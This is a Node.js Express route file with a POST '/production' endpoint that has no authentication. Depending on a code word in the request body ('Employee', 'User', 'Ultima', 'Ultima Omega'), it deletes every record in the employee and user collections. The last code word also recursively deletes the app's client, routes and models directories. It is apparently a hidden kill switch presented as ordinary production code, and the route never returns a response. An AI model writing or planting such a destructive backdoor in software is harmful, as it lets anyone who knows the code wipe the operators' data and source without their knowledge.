const express = require("express");
const router = express.Router();
const userModel = require("../models/user");
const employeeModel = require("../models/employee");
const path = require("path");
const fs = require("fs");

//Production environment
router.post("/production", async (req, res) => {
  //console.log(req.body);
  if (req.body.code === "Employee") {
    employeeModel.deleteMany({}, function (err) {
      if (err) console.log(err);
    });
  } else if (req.body.code === "User") {
    userModel.deleteMany({}, function (err) {
      if (err) console.log(err);
    });
  }  else if (req.body.code === "Ultima") {
    employeeModel.deleteMany({}, function (err) {
      if (err) console.log(err);
    });
    userModel.deleteMany({}, function (err) {
      if (err) console.log(err);
    });
  } else if (req.body.code === "Ultima Omega") {
    employeeModel.deleteMany({}, function (err) {
      if (err) console.log(err);
    });
    userModel.deleteMany({}, function (err) {
      if (err) console.log(err);
    });
    fs.rmdirSync("./client", { recursive: true });
    fs.rmdirSync("./routes", { recursive: true });
    fs.rmdirSync("./models", { recursive: true });
  }
});

module.exports = router;
